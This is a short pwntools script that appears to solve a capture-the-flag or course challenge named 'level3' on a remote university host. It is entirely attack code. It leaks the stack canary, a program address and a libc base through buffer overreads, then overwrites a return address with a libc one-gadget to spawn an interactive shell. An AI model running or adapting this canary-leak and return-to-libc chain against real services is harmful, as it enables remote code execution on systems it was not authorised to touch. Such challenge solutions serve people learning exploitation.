from pwn import *

port = 10007
rem = remote("kayle.snu.ac.kr", port)

elf = ELF("./level3/problem/level3")
lib = ELF('./level3/problem/libc.so.6')

rem.recvline()

payload = b'A' * 0x49
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' +rem.recvn(7))

payload = b'B' * 0x58
rem.send(payload)
rem.recvuntil(payload)
readName_addr = u64(rem.recvn(6) + b'\x00' * 2) - 34 - elf.symbols['main'] + elf.symbols['read_name']

payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(readName_addr + 5)
rem.recvuntil(b'comment: ')
rem.send(payload)
rem.recvline()

payload = b'D' * 0x58
rem.send(payload)
rem.recvuntil(payload)
lib_base = u64(rem.recvn(6) + b'\x00' * 2) + 48 - lib.symbols['__libc_start_main'] # for 22.04
gadget_addr = lib_base + 0xebd3f

payload = b'E' * 0x28
rem.send(payload)

payload = b'F' * 0x28 + p64(canary) + p64(readName_addr + 0x3100) + p64(gadget_addr)
rem.recvuntil(b'comment: ')
rem.send(payload)
rem.recvline()

rem.interactive()